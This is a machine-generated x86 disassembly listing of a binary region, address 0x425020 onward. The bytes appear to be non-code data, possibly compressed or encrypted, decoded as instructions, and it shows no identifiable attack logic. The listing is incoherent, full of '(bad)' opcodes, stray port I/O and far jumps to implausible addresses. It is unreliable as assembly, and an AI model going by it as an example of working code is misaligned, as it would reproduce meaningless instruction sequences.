  425020:	inc    eax
  425021:	enter  0x9c48,0xd1
  425025:	sub    ebx,DWORD PTR [esi+0x1db8d94]
  42502b:	data16 sbb al,0x65
  42502e:	jne    0x425056
  425030:	mov    ebx,0xdcacfb06
  425035:	mov    ds:0xc4db82c1,al
  42503a:	and    ebx,ebp
  42503c:	inc    edi
  42503d:	(bad)  
  42503e:	lods   al,BYTE PTR ds:[esi]
  42503f:	adc    bl,0x25
  425042:	fsubp  st(1),st
  425044:	aam    0xe1
  425046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425047:	std    
  425048:	test   al,0x50
  42504a:	mov    ds:0xc56c4c09,al
  42504f:	ja     0x4250a3
  425051:	fldenv [esi+0x40]
  425054:	mov    dh,0x5f
  425056:	inc    ebx
  425057:	push   esi
  425058:	mov    ebx,0xcca6b41
  42505d:	retf   0xe842
  425060:	lahf   
  425061:	sub    eax,0x8820584d
  425066:	add    eax,0x6a10e5e8
  42506b:	jns    0x42502f
  42506d:	retf   0x5d7f
  425070:	dec    ebx
  425071:	test   eax,0x806e63be
  425076:	and    DWORD PTR [esp+eiz*4+0x3a],0x8dcd8b58
  42507e:	jo     0x425078
  425080:	cmp    BYTE PTR [ecx+0x7a],0x27
  425084:	pop    eax
  425085:	arpl   WORD PTR [edx-0x4b],bx
  425088:	div    BYTE PTR [edx+edx*8+0x15cba357]
  42508f:	push   0xca35f1cf
  425094:	jmp    0x9f3c4a30
  425099:	out    0x2a,al
  42509b:	push   ecx
  42509c:	test   eax,0x517d2d0d
  4250a1:	mov    dh,0xe3
  4250a3:	pushf  
  4250a4:	clc    
  4250a5:	stos   BYTE PTR es:[edi],al
  4250a6:	in     eax,0x41
  4250a8:	(bad)  
  4250a9:	call   0x95e4a046
  4250ae:	mov    ecx,0xdd656536
  4250b3:	inc    ebx
  4250b4:	iret   
  4250b5:	push   edi
  4250b6:	in     eax,dx
  4250b7:	leave  
  4250b8:	xchg   ebx,eax
  4250b9:	dec    ebx
  4250ba:	mov    edx,0xde2bd92a
  4250bf:	fs int3 
  4250c1:	shl    BYTE PTR [edx-0x11],0x30
  4250c5:	pop    ebx
  4250c6:	scas   eax,DWORD PTR es:[edi]
  4250c7:	dec    ebx
  4250c8:	sub    eax,DWORD PTR [edx]
  4250ca:	pop    ecx
  4250cb:	in     eax,dx
  4250cc:	call   0x15eac78c
  4250d1:	repnz cmc 
  4250d3:	lahf   
  4250d4:	add    ch,BYTE PTR [esi]
  4250d6:	or     esp,ebx
  4250d8:	mov    cs,ebp
  4250da:	cmp    bh,BYTE PTR [ebx-0x5]
  4250dd:	or     BYTE PTR [ebx],bh
  4250df:	jmp    0xddaa9e02
  4250e4:	in     al,dx
  4250e5:	test   al,0xca
  4250e7:	xor    al,0x72
  4250e9:	retf   0xef35
  4250ec:	icebp  
  4250ed:	cmp    esp,DWORD PTR [edx+0x64]
  4250f0:	shl    ah,1
  4250f2:	add    eax,0x11f2b466
  4250f7:	adc    BYTE PTR [edi],0xb9
  4250fa:	clc    
  4250fb:	xchg   ebp,eax
  4250fc:	mov    edi,0x426fdf04
  425101:	(bad)  
  425102:	call   0xf879b02d
  425107:	ret    0xf14f
  42510a:	mov    eax,0x210cb5e7
  42510f:	push   0x26
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xb746:0xb81292e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x8f000001,al
  42518d:	and    eax,0x2c5cb84b
  425192:	fldenv [ebx-0x5482a59f]
  425198:	enter  0x149b,0x39
  42519c:	test   edi,edx
  42519e:	aaa    
  42519f:	in     eax,0xfd
  4251a1:	addr16 mov al,0xac
  4251a4:	shr    DWORD PTR [edx+0x3d],1
  4251a7:	mov    bh,0x7b
  4251a9:	mov    eax,ds:0x452c6c2c
  4251ae:	hlt    
  4251af:	test   ebx,edx
  4251b1:	in     eax,dx
  4251b2:	cmp    al,0x39
  4251b4:	mov    al,ds:0xa55a50a6
  4251b9:	enter  0xb9d6,0x6c
  4251bd:	sbb    DWORD PTR [esi+0x44a15358],0xfffffff3
  4251c4:	cld    
  4251c5:	mov    ebp,0xf0d7991
  4251ca:	mov    BYTE PTR [ebp+0xb],ah
  4251cd:	aas    
  4251ce:	addr16 pop ebx
  4251d0:	add    bh,cl
  4251d2:	mov    esp,ebx
  4251d4:	loopne 0x425188
  4251d6:	or     ah,BYTE PTR [eax+0x51bdb1b6]
  4251dc:	mov    cl,0xd9
  4251de:	adc    eax,0xd1a60dcd
  4251e3:	inc    esp
  4251e4:	pop    ss
  4251e5:	out    dx,eax
  4251e6:	daa    
  4251e7:	retf   
  4251e8:	out    dx,eax
  4251e9:	push   cs
  4251ea:	inc    ebx
  4251eb:	shr    BYTE PTR [esi],1
  4251ed:	(bad)  
  4251ee:	xchg   edi,eax
  4251ef:	outs   dx,BYTE PTR ds:[esi]
  4251f0:	aam    0xa3
  4251f2:	or     ecx,DWORD PTR ds:0xd5cb31c1
  4251f8:	call   0xde7fc165
  4251fd:	cmc    
  4251fe:	dec    edi
  4251ff:	and    esi,DWORD PTR [edi+0x53]
  425202:	cmp    dl,bl
  425204:	jmp    DWORD PTR [ebx+0x3]
  425207:	jns    0x42522b
  425209:	ins    BYTE PTR es:[edi],dx
  42520a:	mov    eax,ds:0x144087d0
  42520f:	xchg   edx,eax
  425210:	enter  0x3240,0x1f
  425214:	xor    al,0x4c
  425216:	mov    ch,bh
  425218:	push   ss
  425219:	into   
  42521a:	xchg   ecx,eax
  42521b:	xor    esp,edi
  42521d:	(bad)  
  42521e:	or     ebp,edx
  425220:	mov    ebx,0x34aa726
  425225:	scas   al,BYTE PTR es:[edi]
  425226:	sbb    esp,ebp
  425228:	inc    edx
  425229:	cld    
  42522a:	lahf   
  42522b:	in     eax,0x18
  42522d:	mov    cl,0xe4
  42522f:	inc    eax
  425230:	dec    ebx
  425231:	rcl    BYTE PTR [eax+0x2f66d7b1],1
  425237:	fbstp  TBYTE PTR [eax+0x34bb1bc4]
  42523d:	or     edx,DWORD PTR [esi]
  42523f:	cmp    bh,BYTE PTR [ebp+0xd75f174]
  425245:	outs   dx,BYTE PTR ds:[esi]
  425246:	mov    dh,0x84
  425248:	ins    BYTE PTR es:[edi],dx
  425249:	and    ebx,esp
  42524b:	retf   
  42524c:	ret    0x5a0
  42524f:	lea    ebp,[ebx]
  425251:	or     BYTE PTR [ebp+0x3a],al
  425254:	cld    
  425255:	xchg   ch,bh
  425257:	xchg   DWORD PTR [edx-0x6f30a8fc],ecx
  42525d:	or     edx,ecx
  42525f:	inc    edx
  425260:	mov    edi,0x58183b6b
  425265:	ins    BYTE PTR es:[edi],dx
  425266:	pop    ds
  425267:	fld    DWORD PTR [ecx-0x2]
  42526a:	arpl   WORD PTR [edx+eax*4-0x43],si
  42526e:	jecxz  0x4252bf
  425270:	into   
  425271:	outs   dx,BYTE PTR ds:[esi]
  425272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425273:	or     BYTE PTR [ecx+0x4cfa26a2],0xc
  42527a:	inc    esp
  42527b:	push   edi
  42527c:	aam    0xd4
  42527e:	iret   
  42527f:	jae    0x42528f
  425281:	xchg   ebp,eax
  425282:	jle    0x4252df
  425284:	bound  ebx,QWORD PTR [edx+eax*8-0x2a]
  425288:	push   ss
  425289:	int    0x61
  42528b:	mov    edi,0x5818d8ff
  425290:	popa   
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	push   ds
  425301:	lds    ebx,FWORD PTR [edx]
  425303:	stos   BYTE PTR es:[edi],al
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x52000001
  42530d:	leave  
  42530e:	dec    eax
  42530f:	cmp    eax,0x8900fc09
  425314:	mul    DWORD PTR [ecx+0x2b]
  425317:	cmp    BYTE PTR [edx-0x161f9f90],al
  42531d:	pop    ecx
  42531e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42531f:	mov    esi,0xefaf2a59
  425324:	(bad)  
  425325:	sbb    al,BYTE PTR [esp+eiz*4-0x5911622e]
  42532c:	in     al,dx
  42532d:	sub    DWORD PTR [edx+0xe8f388a],edi
  425333:	fsubr  DWORD PTR [ebx+ebx*4]
  425336:	in     al,0x29
  425338:	xchg   edx,eax
  425339:	fadd   DWORD PTR [edx]
  42533b:	je     0x425395
  42533d:	loope  0x425315
  42533f:	int    0x35
  425341:	out    dx,eax
  425342:	sbb    DWORD PTR [esi-0x27],ecx
  425345:	ret    
  425346:	sbb    dl,BYTE PTR [ebx+0x287e1bd2]
  42534c:	imul   eax,esp,0x77
  42534f:	pusha  
  425350:	push   ds
  425351:	dec    edi
  425352:	jae    0x4252e4
  425354:	repnz int 0x8b
  425357:	lahf   
  425358:	and    ah,BYTE PTR [edi+ebx*1-0xf]
  42535c:	xor    al,0xc7
  42535e:	cli    
  42535f:	jne    0x425317
  425361:	(bad)
  425364:	adc    BYTE PTR [ebp+0x33],bh
  425367:	or     ecx,DWORD PTR [ebp+0x61e9eda4]
  42536d:	inc    ebp
  42536e:	add    DWORD PTR [edx+ebp*2-0x8c95afe],ecx
  425375:	pop    esp
  425376:	and    dl,BYTE PTR es:[esi+0x3f]
  42537a:	fwait
  42537b:	xchg   esi,eax
  42537c:	adc    ah,ah
  42537e:	xlat   BYTE PTR ds:[ebx]
  42537f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425380:	jmp    0x425360
  425382:	and    bl,0x78
  425385:	dec    ebp
  425386:	mov    ?,ebx
  425388:	cmp    BYTE PTR ds:0xf96d578f,ah
  42538e:	pop    edi
  42538f:	push   edi
  425390:	dec    edi
  425391:	sub    eax,0x5b55bd3a
  425396:	xchg   esi,eax
  425397:	mov    dl,0xc1
  425399:	mov    ch,0xa7
  42539b:	clc    
  42539c:	inc    esi
  42539d:	mov    bl,BYTE PTR [ebx]
  42539f:	xchg   WORD PTR [ebx+0x4d32e320],di
  4253a6:	in     eax,dx
  4253a7:	std    
  4253a8:	stos   BYTE PTR es:[edi],al
  4253a9:	push   edx
  4253aa:	dec    eax
  4253ab:	sar    BYTE PTR [edi-0x448d3356],1
  4253b1:	test   eax,0x51ab69b4
  4253b6:	imul   ecx,DWORD PTR [ecx+0x5e],0x5f32f1db
  4253bd:	sar    DWORD PTR [ebx],0x5c
  4253c0:	dec    eax
  4253c1:	xchg   ebp,eax
  4253c2:	inc    ebx
  4253c3:	jae    0x425377
  4253c5:	xchg   esi,eax
  4253c6:	enter  0x3eb,0x63
  4253ca:	cld    
  4253cb:	mov    eax,ds:0xfae1fc38
  4253d0:	jbe    0x4253ab
  4253d2:	mov    ?,WORD PTR [ebx+eiz*2+0xd6ba74c]
  4253d9:	or     al,0x81
  4253db:	cmp    al,0xde
  4253dd:	mov    eax,ds:0x3cfabe42
  4253e2:	pop    ds
  4253e3:	jns    0x4253c4
  4253e5:	sbb    al,0x6e
  4253e7:	bnd jne 0x4253f5
  4253ea:	pop    es
  4253eb:	pop    ds
  4253ec:	(bad)  [esi-0x15994b64]
  4253f2:	ret    
  4253f3:	imul   BYTE PTR [edx-0x38]
  4253f6:	add    BYTE PTR ds:0x1e2f5106,dl
  4253fc:	aad    0xce
  4253fe:	mov    dh,0x8a
  425400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425401:	mov    ebp,0x23c67d9
  425406:	xchg   ecx,eax
  425407:	cmp    ebp,DWORD PTR [edx]
  425409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42540a:	jne    0x4253c9
  42540c:	arpl   WORD PTR fs:[ebx-0x12],dx
  425410:	jbe    0x425412
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,esp
  425481:	push   0x8e79992a
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0xae000001
  42548d:	sti    
  42548e:	add    bl,dl
  425490:	inc    ecx
  425491:	sub    eax,0xbd572f8a
  425496:	push   DWORD PTR [ebp-0x64]
  425499:	and    ch,BYTE PTR [ebp+0x2a4de0cd]
  42549f:	or     edi,DWORD PTR [esi]
  4254a1:	in     eax,0x76
  4254a3:	cld    
  4254a4:	js     0x4254af
  4254a6:	pop    es
  4254a7:	push   eax
  4254a8:	or     edx,esp
  4254aa:	aaa    
  4254ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254ac:	add    ebx,DWORD PTR [esi-0x67]
  4254af:	and    al,cl
  4254b1:	mov    esi,0x433a3135
  4254b6:	lock lods eax,DWORD PTR ds:[esi]
  4254b8:	adc    eax,0xc9027a93
  4254bd:	xchg   DWORD PTR [edi],ebx
  4254bf:	inc    ebx
  4254c0:	stos   BYTE PTR es:[edi],al
  4254c1:	rcr    DWORD PTR [ebp-0x2],cl
  4254c4:	jl     0x425508
  4254c6:	mov    ch,0xcc
  4254c8:	adc    BYTE PTR [ecx+0x4ff8cb8c],ah
  4254ce:	test   al,0x96
  4254d0:	dec    esi
  4254d1:	sbb    BYTE PTR [ebx],dh
  4254d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254d4:	dec    esp
  4254d5:	xchg   ebx,eax
  4254d6:	stos   BYTE PTR es:[edi],al
  4254d7:	test   BYTE PTR [ecx+ebp*4+0x68bf8ae6],ch
  4254de:	sbb    DWORD PTR [esi+eax*1],esp
  4254e1:	push   cs
  4254e2:	push   es
  4254e3:	lock mov edi,0xd65f1891
  4254e9:	dec    ebx
  4254ea:	and    ecx,DWORD PTR [eax]
  4254ec:	(bad)  
  4254ed:	daa    
  4254ee:	out    dx,eax
  4254ef:	cmp    DWORD PTR [ebp+0x77ac2d8f],0x7a
  4254f6:	dec    ecx
  4254f7:	pop    edx
  4254f8:	push   es
  4254f9:	mov    bl,0xf5
  4254fb:	rcl    BYTE PTR [edi+0x6],0xe0
  4254ff:	rol    dl,0x1d
  425502:	out    0x5c,eax
  425504:	fild   WORD PTR [eax+0x35]
  425507:	xchg   edx,eax
  425508:	sub    eax,DWORD PTR [edi-0x20]
  42550b:	lea    ebx,[ecx]
  42550d:	pop    ebp
  42550e:	xor    al,0x48
  425510:	sbb    eax,0xc54ec05f
  425515:	inc    ebx
  425516:	xor    al,0x1
  425518:	cmc    
  425519:	add    ah,cl
  42551b:	popa   
  42551c:	inc    edx
  42551d:	xor    DWORD PTR [ecx],edi
  42551f:	jge    0x4254c3
  425521:	sbb    ecx,DWORD PTR [ebx+0x3]
  425524:	and    ch,BYTE PTR [ebx+edx*2+0x31663147]
  42552b:	mov    dl,0x86
  42552d:	repz inc eax
  42552f:	push   es
  425530:	jecxz  0x4254d2
  425532:	xchg   esp,eax
  425533:	adc    BYTE PTR [edx-0x26],ch
  425536:	gs xor eax,0x83091ef4
  42553c:	outs   dx,DWORD PTR ds:[esi]
  42553d:	int3   
  42553e:	mov    ah,0xa1
  425540:	pop    ecx
  425541:	stos   BYTE PTR es:[edi],al
  425542:	mov    eax,ds:0xba321f7a
  425547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425548:	ins    BYTE PTR es:[edi],dx
  425549:	sub    DWORD PTR [ebp+0x5],edx
  42554c:	sahf   
  42554d:	(bad)  
  42554e:	and    eax,0x71c42ec7
  425553:	mov    bh,dh
  425555:	pop    ecx
  425556:	bound  ebp,QWORD PTR [edi]
  425558:	inc    ecx
  425559:	cmp    BYTE PTR [ebp-0x3b],bh
  42555c:	(bad)  
  42555d:	jnp    0x425571
  42555f:	jge    0x4254ee
  425561:	jecxz  0x42553a
  425563:	stc    
  425564:	sub    edi,DWORD PTR [eax+0x2fe62722]
  42556a:	std    
  42556b:	add    al,0x22
  42556d:	adc    eax,0x3b2974da
  425572:	jno    0x425523
  425574:	fld    QWORD PTR [eax+0x11]
  425577:	imul   esp,DWORD PTR [edx-0x50],0x8e469f5f
  42557e:	test   BYTE PTR [ebx+0x238823bb],dh
  425584:	ja     0x4255c5
  425586:	in     eax,0xed
  425588:	shr    DWORD PTR [esi*8+0x13f0fc09],cl
  42558f:	sbb    DWORD PTR [esi],ecx
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x433bf13a
  425602:	pop    eax
  425603:	jnp    0x425683
  425605:	pop    DWORD PTR [ecx]
  425607:	add    BYTE PTR ds:0x5c000001,al
  42560d:	out    dx,eax
  42560e:	jne    0x42565c
  425610:	ja     0x4255ff
  425612:	mov    al,ds:0xa8ccb71d
  425617:	cmp    BYTE PTR [eax-0x4d],dh
  42561a:	xchg   ecx,eax
  42561b:	cmp    eax,0xbb4184f6
  425620:	pop    ecx
  425621:	mov    esi,gs
  425623:	aad    0x93
  425625:	mov    WORD PTR [ebp-0x7a],gs
  425628:	jl     0x42563f
  42562a:	mov    ebx,0xa7f12720
  42562f:	xchg   ebp,eax
  425630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425631:	mov    eax,ds:0x9b3bb82b
  425636:	ret    
  425637:	push   esi
  425638:	repz xor bh,ch
  42563b:	arpl   WORD PTR [ecx+ebx*2],di
  42563e:	dec    ebp
  42563f:	and    ecx,DWORD PTR [ebp+0x1328d1ac]
  425645:	out    dx,eax
  425646:	push   ecx
  425647:	xlat   BYTE PTR ds:[ebx]
  425648:	pop    ebp
  425649:	mov    bl,ah
  42564b:	imul   ecx,DWORD PTR [eax+eax*2+0x59],0xe57183ad
  425653:	repz pop ss
  425655:	fld    TBYTE PTR [eax]
  425657:	add    DWORD PTR [eax-0x65],edi
  42565a:	pop    ecx
  42565b:	fstp   TBYTE PTR [ebx+0x3]
  42565e:	dec    esi
  42565f:	mov    esp,0x6eddd984
  425664:	cwde   
  425665:	xchg   edi,eax
  425666:	add    ch,al
  425668:	bound  edx,QWORD PTR [ebp-0x6033927e]
  42566e:	in     al,0x5
  425670:	(bad)  
  425671:	aad    0xc9
  425673:	or     BYTE PTR [ebx],dh
  425675:	jo     0x4256e2
  425677:	lea    esp,[ebx+0x67029407]
  42567d:	pop    edx
  42567e:	das    
  42567f:	jmp    0x17a7:0xfbd4846b
  425686:	dec    esi
  425687:	ins    BYTE PTR es:[edi],dx
  425688:	lods   al,BYTE PTR ds:[esi]
  425689:	hlt    
  42568a:	shl    BYTE PTR [esp+ebp*1-0x1c9ffb4e],0x8c
  425692:	int3   
  425693:	imul   ebp,DWORD PTR [ebp-0x31],0x7608cb45
  42569a:	sub    dl,BYTE PTR [edi]
  42569c:	lea    esi,es:[ebx-0x2e28ea76]
  4256a3:	enter  0xddfe,0x66
  4256a7:	retf   
  4256a8:	call   0xbf3a:0x698d9d7b
  4256af:	fisubr DWORD PTR [ebp+0x19]
  4256b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256b3:	push   ebx
  4256b4:	inc    ecx
  4256b5:	test   al,0x42
  4256b7:	(bad)  
  4256ba:	mov    edx,0xf1a0cf28
  4256bf:	mov    ch,al
  4256c1:	scas   eax,DWORD PTR es:[edi]
  4256c2:	gs mov dh,0xd6
  4256c5:	loope  0x42565a
  4256c7:	jno    0x4256d4
  4256c9:	popa   
  4256ca:	xchg   edx,eax
  4256cb:	aaa    
  4256cc:	mov    ch,0x6d
  4256ce:	rol    BYTE PTR [ebp-0x2a],cl
  4256d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256d2:	pop    edx
  4256d3:	idiv   BYTE PTR ds:0xf2935e26
  4256d9:	push   edx
  4256da:	fwait
  4256db:	xchg   ecx,eax
  4256dc:	add    BYTE PTR [ecx-0x1ffccce7],dl
  4256e2:	leave  
  4256e3:	outs   dx,DWORD PTR ds:[esi]
  4256e4:	xchg   edx,eax
  4256e5:	lds    esp,FWORD PTR [edx+0x9e7a60f]
  4256eb:	jno    0x425746
  4256ed:	cwde   
  4256ee:	pop    esi
  4256ef:	aas    
  4256f0:	jmp    0x42573f
  4256f2:	mov    eax,DWORD PTR [ebx+0x3]
  4256f5:	jo     0x425718
  4256f7:	pop    edi
  4256f8:	push   0x6ccf36f8
  4256fd:	jl     0x4256a9
  4256ff:	loop   0x42572a
  425701:	fcomp  QWORD PTR [edx+0x37044604]
  425707:	(bad)  
  425708:	scas   al,BYTE PTR es:[edi]
  425709:	sti    
  42570a:	pop    edx
  42570b:	enter  0x343f,0x38
  42570f:	test   edi,0x0
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x77c60974
  425783:	sub    al,0x83
  425785:	nop
  425786:	add    DWORD PTR [eax],eax
  425788:	add    eax,0xd5000001
  42578d:	cmp    cl,BYTE PTR [eax]
  42578f:	cmp    ecx,ebx
  425791:	aas    
  425792:	sub    bl,BYTE PTR [ecx+0x75b75c7]
  425798:	and    eax,0x683eb325
  42579d:	or     eax,0x8c6e93af
  4257a2:	cmp    cl,ch
  4257a4:	int3   
  4257a5:	sub    dl,BYTE PTR [ecx+0x29]
  4257a8:	dec    ebp
  4257a9:	cmp    esi,esp
  4257ab:	mov    dl,0xf6
  4257ad:	jle    0x425754
  4257af:	jecxz  0x42575a
  4257b1:	jmp    0x5c237227
  4257b6:	pop    ss
  4257b7:	mov    al,ds:0x4cc7a1ba
  4257bc:	pusha  
  4257bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257be:	rcr    BYTE PTR [ecx-0x5c],1
  4257c1:	test   esi,edi
  4257c3:	(bad)  
  4257c4:	das    
  4257c5:	pop    ds
  4257c6:	mov    eax,ds:0x7cfaa765
  4257cb:	js     0x425783
  4257cd:	push   ebx
  4257ce:	jb     0x42577c
  4257d0:	fdivrp st(7),st
  4257d2:	xor    edi,DWORD PTR [eax+0x74abdceb]
  4257d8:	sub    edx,DWORD PTR [eax-0x34]
  4257db:	loopne 0x425772
  4257dd:	mov    al,0xbb
  4257df:	nop
  4257e0:	inc    esi
  4257e1:	sbb    esp,DWORD PTR [esi-0x77454d43]
  4257e7:	jp     0x425814
  4257e9:	xor    eax,0xf56cc3cd
  4257ee:	xlat   BYTE PTR ds:[ebx]
  4257ef:	sub    BYTE PTR [ebp+0x42],bl
  4257f2:	xchg   esi,eax
  4257f3:	jae    0x4257e6
  4257f5:	jle    0x4257db
  4257f7:	xlat   BYTE PTR ds:[ebx]
  4257f8:	mov    ebx,0xded9418e
  4257fd:	inc    ebx
  4257fe:	jle    0x42580e
  425800:	stc    
  425801:	cmc    
  425802:	mov    edi,DWORD PTR [ebp+0x44]
  425805:	das    
  425806:	adc    BYTE PTR ds:0xe4ed4266,0x4a
  42580d:	mov    DWORD PTR [ecx],edx
  42580f:	mov    cl,0xa2
  425811:	mov    ebx,0x7bc6cfb1
  425816:	lea    esi,[ebx+eiz*4+0x5c]
  42581a:	test   al,0x6c
  42581c:	mov    si,WORD PTR [ebx-0x3b]
  425820:	fwait
  425821:	xor    dh,al
  425823:	call   0xdc73:0xe6db24ef
  42582a:	pop    eax
  42582b:	mov    al,0x37
  42582d:	pop    ebp
  42582e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42582f:	or     bh,BYTE PTR [esi-0x76]
  425832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425833:	fs jecxz 0x425890
  425836:	xor    dl,BYTE PTR [edx]
  425838:	(bad)  
  425839:	out    dx,eax
  42583a:	loop   0x4257e0
  42583c:	push   eax
  42583d:	ror    DWORD PTR [ebx+0xe],cl
  425840:	retf   
  425841:	cmp    BYTE PTR [ecx+0x71],ah
  425844:	test   esi,ecx
  425846:	mov    eax,0x3008741f
  42584b:	lock es jp 0x4258ce
  42584f:	addr16 cmp eax,0x69596e92
  425855:	cmp    al,0x97
  425857:	mov    edx,0xd201a6e4
  42585c:	push   edi
  42585d:	ret    
  42585e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42585f:	sbb    ax,0xcfde
  425863:	jns    0x42585b
  425865:	ss (bad) 
  425867:	nop
  425868:	xor    DWORD PTR [eax+eax*1],eax
  42586b:	push   eax
  42586c:	mov    dh,0x5f
  42586e:	int3   
  42586f:	inc    ebp
  425870:	jns    0x425851
  425872:	sub    DWORD PTR ds:0x7f64474b,ebx
  425878:	inc    ebp
  425879:	jo     0x42582e
  42587b:	add    ch,BYTE PTR [ecx]
  42587d:	aaa    
  42587e:	aad    0x4f
  425880:	and    BYTE PTR [ebx+0x34d75846],al
  425886:	pushf  
  425887:	in     al,0x3a
  425889:	inc    ebx
  42588a:	or     cl,BYTE PTR [ebx+eiz*8+0x5d66c356]
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	aam    0xb2
  425902:	aaa    
  425903:	xchg   edi,eax
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	mov    WORD PTR [ebx+ecx*4+0x13],?
  425910:	xor    edx,DWORD PTR [ebx-0x5f063c23]
  425916:	xor    eax,0x7a7c46d8
  42591b:	arpl   WORD PTR ds:0x85376d18,cx
  425921:	pop    edi
  425922:	sar    DWORD PTR [edi-0x37],cl
  425925:	xor    al,0xbf
  425927:	ret    
  425928:	popa   
  425929:	ror    BYTE PTR [eax-0x659cb964],0xdf
  425930:	imul   esi,DWORD PTR [esi-0x21],0x61
  425934:	in     al,dx
  425935:	fisubr WORD PTR [esi]
  425937:	jecxz  0x425922
  425939:	mov    al,0xc4
  42593b:	xor    edi,esi
  42593d:	cmp    DWORD PTR [eax],ebp
  42593f:	imul   esp,DWORD PTR [edi+0x1f],0x69
  425943:	rcr    DWORD PTR [ecx],cl
  425945:	jns    0x425974
  425947:	arpl   WORD PTR [edx+0x6],bp
  42594a:	sbb    ecx,edx
  42594c:	pop    eax
  42594d:	call   DWORD PTR [edi+0x62]
  425950:	inc    eax
  425951:	loop   0x425912
  425953:	outs   dx,BYTE PTR ds:[esi]
  425954:	push   0x3a3080ee
  425959:	jg     0x6569e33e
  42595f:	xchg   edx,eax
  425960:	in     eax,0xc2
  425962:	aam    0xca
  425964:	xchg   edi,eax
  425965:	sub    al,0x3d
  425967:	mov    fs,eax
  425969:	pop    edx
  42596a:	(bad)  
  42596b:	shl    BYTE PTR ds:0xb6d62525,cl
  425971:	and    DWORD PTR [ecx+ebp*1],edx
  425974:	pop    edi
  425975:	adc    ebp,edi
  425977:	adc    DWORD PTR [esi-0x756152d9],ecx
  42597d:	mov    ds:0xb3783fa,al
  425982:	xor    DWORD PTR [eax+ebx*8],ebx
  425985:	and    al,0x3f
  425987:	lea    edi,[edi]
  425989:	mov    al,0x9d
  42598b:	mov    esi,0x8f463675
  425990:	sar    DWORD PTR [edx],1
  425992:	mov    edi,0x8dc252ca
  425997:	popa   
  425998:	imul   ebx,eax,0xfce49867
  42599e:	mov    ecx,0xc044c885
  4259a3:	mov    edx,0xf6c01d48
  4259a8:	outs   dx,BYTE PTR ds:[esi]
  4259aa:	and    al,0x41
  4259ac:	in     eax,0xfd
  4259ae:	in     eax,0xfd
  4259b0:	into   
  4259b1:	and    eax,0xbec5ae4f
  4259b6:	mov    edx,0x77f194a7
  4259bb:	int    0x7b
  4259bd:	iret   
  4259be:	out    dx,eax
  4259bf:	pop    ss
  4259c0:	mov    edx,0x7fc810c5
  4259c5:	jge    0x4259e9
  4259c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259c8:	mov    ecx,0xb000947
  4259cd:	out    dx,eax
  4259ce:	xor    eax,0x79fca2aa
  4259d3:	adc    DWORD PTR [ebx+0xc],ebx
  4259d6:	sbb    DWORD PTR [edx-0x52603cf3],0x30c2fd86
  4259e0:	outs   dx,BYTE PTR ds:[esi]
  4259e1:	repz pop edx
  4259e3:	pop    eax
  4259e4:	cld    
  4259e5:	mov    es,WORD PTR [ecx]
  4259e7:	add    BYTE PTR [edx],dl
  4259e9:	pushf  
  4259ea:	jne    0x425a5d
  4259ec:	xor    cl,al
  4259ee:	jecxz  0x425a6c
  4259f0:	sub    BYTE PTR [ebx+0xf],al
  4259f3:	mov    cl,0x87
  4259f5:	lahf   
  4259f6:	scas   eax,DWORD PTR es:[edi]
  4259f7:	(bad)  
  4259f8:	pop    ss
  4259f9:	in     al,0x89
  4259fb:	fs inc esp
  4259fd:	inc    ecx
  4259fe:	dec    esp
  4259ff:	and    BYTE PTR [ebx+0xd79dd1a],ch
  425a05:	ins    BYTE PTR es:[edi],dx
  425a06:	ins    BYTE PTR es:[edi],dx
  425a07:	adc    dh,BYTE PTR [eax-0x40]
  425a0a:	push   ecx
  425a0b:	dec    edi
  425a0c:	push   0xd11226e7
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
